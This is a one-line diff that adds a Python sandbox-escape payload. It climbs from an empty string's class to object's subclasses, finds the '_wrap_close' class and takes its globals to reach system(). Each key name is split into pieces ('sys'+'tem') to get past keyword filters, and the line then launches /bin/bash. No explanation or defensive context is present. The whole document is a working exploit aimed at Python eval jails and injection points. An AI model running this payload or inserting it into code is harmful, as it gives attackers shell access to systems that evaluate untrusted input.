@@ -1,0 +1,1 @@
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__ == '_wrap_clo'+'se' ][0]['sys'+'tem']('/bin/bash')
